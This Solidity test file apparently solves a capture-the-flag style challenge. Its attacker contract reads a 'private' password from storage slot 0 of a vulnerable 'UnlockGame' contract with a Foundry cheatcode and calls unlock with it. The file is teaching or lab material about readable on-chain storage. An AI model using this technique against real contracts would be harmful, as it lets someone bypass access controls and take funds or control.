// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Victim.sol";

contract UnlockGameAttacker is Test {
    UnlockGame game;

    constructor(address _game) {
        game = UnlockGame(_game);
    }

    function Attack() public {
        bytes32 password = vm.load(address(game), bytes32(uint256(0)));
        game.unlock(uint256(password));
    }

    fallback() external payable {}
}
